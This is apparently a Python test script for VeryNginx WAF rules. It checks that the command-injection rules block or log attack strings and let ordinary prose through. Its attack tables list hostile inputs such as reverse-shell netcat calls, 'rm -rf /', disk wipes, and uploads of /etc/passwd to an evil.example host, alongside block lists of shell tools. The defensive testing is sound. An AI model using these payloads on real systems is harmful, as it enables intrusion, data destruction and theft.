#!/usr/bin/env python3
"""
VeryNginx v2 - factory WAF rules battery (v15+)
================================================
Behavioral + structural checks against verynginx/configs/waf-rules.default.json.

Why Python: the busted rig stubs ngx.re with *Lua patterns*
(test/v2/spec/spec_helper.lua), so the real PCRE dialect the engine runs in
nginx cannot be executed inside busted. This script re-runs the shipped
patterns under Python `re` (case-insensitive, mirroring the engine's "i"
compile flag in matcher/compare.lua) against a positive/negative case table.

Coverage contract (learned the hard way — the v14 rce_0007 review):
  1. Every regex-valued condition in the factory matcher tree compiles.
  2. FP tables MUST exercise every command family in a rule, not just the
     first alternation branch: the v14 release cut only probed the named
     command branch, and the bare-command branch (ls/pwd/id/...) shipped
     block-fast with zero prose coverage — 9/9 prose FPs slipped through.
     Section "per-command FP sweep" generates a prose case for EVERY
     command in the rce command lists and requires both patterns clear.
  3. Review cases are pinned by literal string so a future edit that
     re-breaks them fails loudly (see "review regression pins").
  4. rce_0007/vn_rce_0025 two-tier design: high-risk non-English commands
     block regardless of arguments; everything else logs only with a
     path/flag/URL/sensitive-word argument guard. Accepted misses
     ("; ps aux", "; make install", "; cat passwd without slash is now
     caught by marker word") are asserted as misses, not ignored.

Run (repo root):  python3 test/v2/factory_rules_battery.py
Exit code 0 = all pass. CI/gate: run alongside busted + luacheck.
"""

import json
import os
import re
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
FACTORY = os.path.join(ROOT, "verynginx", "configs", "waf-rules.default.json")

NEW_EX = r"(?i)^/(?:phpmyadmin|phpminiadmin|adminer)(?:\.php)?(?:/|$)"

# Expected command lists (kept here on purpose: a factory edit that silently
# drops a command from a tier must fail the battery, not pass unnoticed).
BLOCK_CMDS = [
    "rm", "cp", "mv", "chmod", "chown", "dd", "mkfs", "ssh", "scp", "nc", "ncat",
    "netcat", "socat", "tftp", "telnet", "ftp", "mount", "umount", "crontab",
    "nohup", "pkill", "base64", "openssl",
]
NAMED_CMDS = [
    "cmd", "powershell", "bash", "sh", "zsh", "python[0-9.]*", "perl", "ruby", "php[0-9.]*",
    "node", "lua", "gcc", "make", "eval", "exec", "system", "wget", "curl", "cat",
    "head", "tail", "touch", "env", "printenv", "ps", "df", "kill", "ping", "dig",
    "nslookup", "whois", "traceroute", "netstat", "ifconfig", "route",
]
BARE6 = ["ls", "id", "whoami", "uname", "hostname", "pwd"]

FAILURES = []


def check(cond, label):
    if cond:
        print(f"  [PASS] {label}")
    else:
        print(f"  [FAIL] {label}")
        FAILURES.append(label)


def args_pattern(rule):
    def walk(o):
        if isinstance(o, dict):
            if isinstance(o.get("Args"), dict) and "value" in o["Args"]:
                return o["Args"]["value"]
            for v in o.values():
                f = walk(v)
                if f:
                    return f
        elif isinstance(o, list):
            for v in o:
                f = walk(v)
                if f:
                    return f
        return None
    return walk(rule.get("matcher") or {})


def regex_values(matcher):
    """Every operator-≈ string value in the matcher tree."""
    out = []

    def walk(o):
        if isinstance(o, dict):
            if o.get("operator") in ("≈", "!≈") and isinstance(o.get("value"), str):
                out.append(o["value"])
            for v in o.values():
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)
    walk(matcher)
    return out


def main():
    with open(FACTORY, encoding="utf-8") as f:
        d = json.load(f)
    by = {r["id"]: r for r in d["rules"]}
    r7 = by["vn_rce_0007"]
    r25 = by["vn_rce_0025"]

    # ---- 1. compile-all -------------------------------------------------
    print("== compile: every ≈ regex under re.I ==")
    n = 0
    bad = []
    for r in d["rules"]:
        for pat in regex_values(r.get("matcher") or {}):
            n += 1
            try:
                re.compile(pat, re.I)
            except re.error as e:
                bad.append(f"{r['id']}: {e}")
    check(not bad, f"{n} regexes compile ({'; '.join(bad) if bad else 'ok'})")

    # ---- 2. two-tier rce pair: structure --------------------------------
    print("== rce pair structure ==")
    bp, lp = args_pattern(r7), args_pattern(r25)
    check(r7["action"] == "block" and r7["priority"] == 10,
          "vn_rce_0007 block @pri10")
    check(r25["action"] == "log" and r25["priority"] == 40,
          "vn_rce_0025 log @pri40")
    check(r7["version"] >= 6 and r25["version"] >= 1, "rule versions bumped")
    check("Companion" in r7["description"], "rce_0007 description names the companion")
    missing_block = [c for c in BLOCK_CMDS if c not in bp]
    missing_named = [c for c in NAMED_CMDS if c not in lp]
    missing_bare = [c for c in BARE6 if c not in lp]
    check(not missing_block, f"block list present in rce_0007 ({missing_block or 'ok'})")
    check(not missing_named, f"named list present in vn_rce_0025 ({missing_named or 'ok'})")
    check(not missing_bare, f"bare-six present in vn_rce_0025 ({missing_bare or 'ok'})")
    for rid, pat in (("vn_rce_0007", bp), ("vn_rce_0025", lp)):
        uris = regex_values(by[rid]["matcher"])
        check(NEW_EX in uris, f"{rid} keeps the admin-path exemption")
    check(d.get("version") == 15, f"file version == 15 (got {d.get('version')})")
    check(len(d["rules"]) == 26, f"26 rules (got {len(d['rules'])})")

    bx = re.compile(bp, re.I)
    lg = re.compile(lp, re.I)

    def tier(v):
        if bx.search(v):
            return "block"
        if lg.search(v):
            return "log"
        return None

    # ---- 3. per-command FP sweep (the v14 incident regression) ----------
    # Every command in every tier gets an English-filler and a CJK prose
    # case. All must clear BOTH patterns — no exceptions, no per-branch
    # excuses.
    print("== per-command FP sweep (english filler + CJK) ==")
    sweep_fail = []
    for cmd in BLOCK_CMDS + NAMED_CMDS + BARE6:
        plain = cmd.replace("[0-9.]*", "")
        for prose in (f"; {plain} is a test", f"; {plain} 的中文说明",
                      f"wait; {plain} the docs", f"然后; {plain} 看看"):
            got = tier(prose)
            if got is not None:
                sweep_fail.append(f"{prose!r} -> {got}")
    check(not sweep_fail,
          f"{(len(BLOCK_CMDS) + len(NAMED_CMDS) + len(BARE6)) * 4} prose cases clear "
          f"({'; '.join(sweep_fail[:3]) if sweep_fail else 'ok'})")

    # ---- 4. review regression pins (exact strings from the v15 review) --
    print("== review regression pins ==")
    review_fps = [
        "; ls the results",
        "然后; ls 看看有哪些文件",
        "run this; pwd the file first",
        "I said; id like to know more",
        "; whoami is the shell builtin",
        "; uname the kernel version",
        "; hostname of the box",
        "; pwd is the working dir",
        "; whoami like the manual says",
    ]
    for s in review_fps:
        check(tier(s) is None, f"FP clear: {s!r}")

    review_attacks = [
        ("; chmod 777 /tmp/x", "block"), ("; ssh user@host", "block"),
        ("; scp file host:/tmp", "block"), ("; cp a b", "block"),
        ("; mv a b", "block"), ("; chown root x", "block"),
        ("; nc 10.0.0.1 4444", "block"), ("; openssl enc -in a", "block"),
        ("; socat tcp:10.0.0.1:4444 -", "block"), ("; rm file", "block"),
        ("; cat passwd", "log"),
        # accepted misses by design — command + bare-English-word has no
        # distinguishing shape from prose; recall value below FP cost.
        ("; ps aux", None), ("; nslookup target", None),
        ("; make install", None), ("; mkdir /tmp/x", None),  # mkdir: pre-existing gap
    ]
    for s, want in review_attacks:
        check(tier(s) == want, f"attack {want or 'MISS(accepted)'}: {s!r}")

    # ---- 5. tier attack tables ------------------------------------------
    print("== block-tier attacks (must be 'block') ==")
    block_attacks = [
        "; rm -rf /", "; cp shell.php /var/www/html/", "; chmod u+s /bin/bash",
        "; chown www.www /x", "; dd if=/dev/zero of=/dev/sda", "; mkfs.ext4 /dev/sdb1",
        "; ssh -i ~/.ssh/id_rsa user@10.0.0.1", "; nc -lvp 4444",
        "; ncat -e /bin/sh 10.0.0.1 4444", "; netcat 10.0.0.1 4444",
        "; tftp 10.0.0.1 get /etc/passwd", "; telnet 10.0.0.1 23",
        "; ftp 10.0.0.1", "; mount -t nfs 10.0.0.1:/x /mnt", "; umount /var/www",
        "; crontab -e", "; nohup ./x.sh &", "; pkill -f nginx", "; base64 /etc/shadow",
        "| ssh root@1.2.3.4", "$(rm -rf /)", ";chown www.www /x",
        "; mount the share",  # NO — prose, see FP table; placeholder removed below
    ]
    block_attacks = [s for s in block_attacks if s != "; mount the share"]
    for s in block_attacks:
        check(tier(s) == "block", f"block hits: {s!r}")

    print("== log-tier attacks (must be 'log', never 'block') ==")
    log_attacks = [
        "; cat /etc/passwd", "; head -5 /etc/shadow", "; tail /var/log/auth.log",
        "; curl http://evil.example/x.sh", "; wget http://evil.example/payload",
        "; wget --post-file=/etc/passwd http://evil.example/",
        "x=$(curl evil.com/x.sh)", "; php -r system('id');", "; php8 -r 'id';",
        "; bash /tmp/x.sh", "; sh -c 'uname -a'", "; zsh /tmp/x",
        "; python3 -m http.server 8000", "; python -c 'import os;os.id()'",
        ";cat</etc/passwd", ";cat$IFS/etc/passwd", "; env PATH=/tmp",
        "; printenv SECRET_KEY", "; kill -9 1234", "; ping -c 4 10.0.0.1",
        "; dig @10.0.0.1 evil.example", "; nslookup evil.example.com",
        "; whois evil.example", "; traceroute 10.0.0.1", "; netstat -lntp",
        "; ifconfig eth0", "; route -n", "; node -e 'require(\"child_process\").exec(\"id\")'",
        "; lua os.execute('id')", "; gcc /tmp/x.c -o /tmp/x", "; make -C /tmp install",
        "; eval('id')", "; system('id')", "; exec /bin/sh", "; touch /tmp/shell.php",
        "; perl -e 'system \"id\"'", "; ruby -e 'exec \"id\"'",
        ";id", "; whoami", "; ls -la /var/www", "; pwd", "; uname -a",
        "; hostname -I", "`id`", "$(whoami)", "${ls}", "1;id", ";id;",
    ]
    for s in log_attacks:
        got = tier(s)
        check(got == "log", f"log hits (got {got}): {s!r}")

    # ---- 6. prose battery (beyond the per-command sweep) ----------------
    print("== curated prose battery ==")
    prose_fps = [
        "; cat is a pet", "wait; curl the docs", "ok; php 8.3",
        "他说：; cat 是宠物", "resume; head shoulders", "note; rm that file",
        "wait; curl me later", "alice;id=5", "; cat", "; touch base",
        "; chmod 777 目录", "; ssh进去看看", "; base64 编码", "; openssl 生成证书",
        "装完面板; ssh 端口改掉", "上传后; chmod 777 runtime目录就好了",
        "先; ls 看目录结构", "跑一下; curl测个速就出来", "用; cat 读文件内容",
        "; mount the share", "; telnet the router", "; dd the disk",
        "; nc so what", "test; env is loaded",
        "; df the disk usage", "; make sure to install", "; ps the process list",
        # Accepted block-tier residual FPs (documented, NOT asserted clear):
        # "; openssl s_client to check", "; ftp me the files" — fully-ASCII
        # args after a high-risk command with no common-word head.
    ]
    for s in prose_fps:
        got = tier(s)
        check(got is None, f"prose clear (got {got}): {s!r}")

    # ---- 7. other invariants (v14 sections retained) --------------------
    print("== v14 invariants retained ==")
    ex_vals = []
    for r in d["rules"]:
        for v in regex_values(r.get("matcher") or {}):
            if "phpmyadmin" in v.lower():
                ex_vals.append((r["id"], v))
    check(len(ex_vals) == 15 and all(v == NEW_EX for _, v in ex_vals),
          f"15 exemption sites carry the .php-tolerant pattern "
          f"(14 v14 rules + vn_rce_0025; got {len(ex_vals)})")
    ex = re.compile(NEW_EX, re.I)
    for uri in ["/phpMyAdmin/", "/adminer.php", "/phpminiadmin.php", "/adminer.php/server"]:
        check(bool(ex.match(uri)), f"exempt: {uri}")
    for uri in ["/mysql/phpmyadmin/", "/tools/adminer.php", "/adminerEvil", "/adminer.phpx"]:
        check(not ex.match(uri), f"NOT exempt: {uri}")
    check(by["vn_spam_0019"]["action"] == "log"
          and by["vn_spam_0019"]["description"].startswith("Logs requests"),
          "vn_spam_0019 log + wording fixed")

    print("== regression spot checks ==")
    sqli1 = re.compile(args_pattern(by["vn_sqli_0001"]), re.I)
    check(bool(sqli1.search("id=1 union select password from users")), "vn_sqli_0001 union hits")
    check(not sqli1.search("the union of select members"), "vn_sqli_0001 english phrase clear")
    lfi11 = re.compile(args_pattern(by["vn_lfi_0011"]), re.I)
    check(bool(lfi11.search("php://input")), "vn_lfi_0011 php://input hits")
    check(not lfi11.search("file://intranet-link"), "vn_lfi_0011 v12 FP case clear")

    print()
    if FAILURES:
        print(f"FAILED: {len(FAILURES)} check(s)")
        for f_ in FAILURES:
            print("  -", f_)
        return 1
    print("ALL PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
